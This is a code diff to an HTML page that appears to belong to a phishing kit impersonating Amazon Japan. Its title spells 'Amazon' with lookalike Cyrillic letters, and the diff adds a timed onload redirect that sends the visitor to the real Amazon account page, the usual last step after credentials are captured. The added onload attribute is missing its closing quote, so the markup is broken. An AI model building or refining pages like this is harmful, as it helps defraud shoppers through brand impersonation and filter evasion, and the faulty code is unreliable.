@@ -13,7 +13,7 @@
     <link rel="shortcut icon" href="assets/img/favicon.ico" />
     <title>Congratulations - Amаzоn</title>
 </head>
-<body>
+<body onload="myFunction()>
     <a href="#" class="navbrand text-center mt-3">
         <span class="aicon alogo"></span>
     </a>
@@ -56,7 +56,14 @@
 <script>
     $("#kiddbtn1").click(function () {
         window.location.href = 'https://www.amazon.co.jp/gp/css/homepage.html/ref=nav_youraccount_ya';
-    })
+    });
+    var myVar;
+    function myFunction() {
+        myVar = setTimeout(showPage, 500);
+    }
+    function showPage() {
+        window.location.href = 'https://www.amazon.co.jp/gp/css/homepage.html/ref=nav_youraccount_ya';
+    }
 </script>
 </body>
 </html>
